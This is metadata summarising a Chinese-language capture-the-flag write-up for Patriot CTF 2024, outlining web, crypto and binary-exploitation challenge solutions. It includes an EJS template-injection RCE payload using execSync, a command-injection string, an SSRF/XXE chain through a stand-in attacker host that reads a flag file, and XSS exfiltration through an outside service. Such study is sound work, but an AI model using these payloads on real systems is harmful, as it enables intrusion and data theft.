---
title: Patriot CTF 2024 WriteUp
contest: Patriot CTF 2024
year: 2024
difficulty: high
vuln_type: ssti
tags: [flask, xss, csrf, session-forge, xxe, ejs-rce, sha1-extension, largebin-attack, fmt-string, ret2libc, blind]
attack_chain:
  - giraffe notes: 加 X-Forwarded-For: 127.0.0.1 即拿 flag
  - Impersonate: server_start_str="20240921153014" 派生 secret_key=sha256
  - /status 拿当前时间 → 算 10 分钟内 server_start_str → 伪造 admin session
  - Open Seasame: username 字段 XSS 让 adminbot 访问 /api/cal
  - XMLHttpRequest withCredentials 拿 /api/cal 响应 → pipedream 外带
  - /api/cal?modifier=|cat flag.txt 触发命令执行
  - Dogdays: SHA-1 length extension attack 改 view.php?pic=&hash=
  - 自实现 SHA-1 rotl + add + f/K 常量 + 块 1=1.png 块 2=/../../../flag
  - Domdom: SSRF url=http://attacker/get-json 拿 XXE 注入 DOCTYPE 读 file:///app/flag.txt
  - Blob: EJS 模板 RCE ?settings[view options][client]=1&settings[view options][escape]={}.constructor.constructor(...)
  - Not So Shrimple Is Pwn: 简单栈溢出写 retaddr=0x401282 走 cool... 路径
  - Shellcrunch: XOR 编码绕过 + jmp rsp 重定位 + 自构造 read syscall 注入 shellcode
  - Navigator: setpin 负索引越界 + viewpin 泄 canary+libc+pie 逐字节爆破
  - Flight Script Pwn: largebin attack 改 loglen → 溢出 0x118 后 ret2libc
  - Strings Only: 非栈上 fmt-string 多次 sendline 拼 %p 泄地址
key_payload: ejs poc=settings[view options][escape]={}.constructor.constructor("return process.mainModule.require('child_process').execSync('cat flag-6637c8dd34.txt')")
one_liner: Patriot CTF 2024 狼组 WP 大全：Web (X-Forwarded/Session 伪造/XSS/XXE/EJS RCE) + Crypto (SHA-1 长度扩展) + Pwn (栈溢出/largebin/非栈 fmt)。
lesson: Flask session secret_key 与启动时间挂钩可爆破；X-Forwarded-For 是入门级 IP 伪造；EJS settings[view options][escape] 是 RCE 高危面；largebin attack 写全局变量是 ret2libc 前置；SHA-1 长度扩展可绕过 secret 中间校验。
quality: high
---
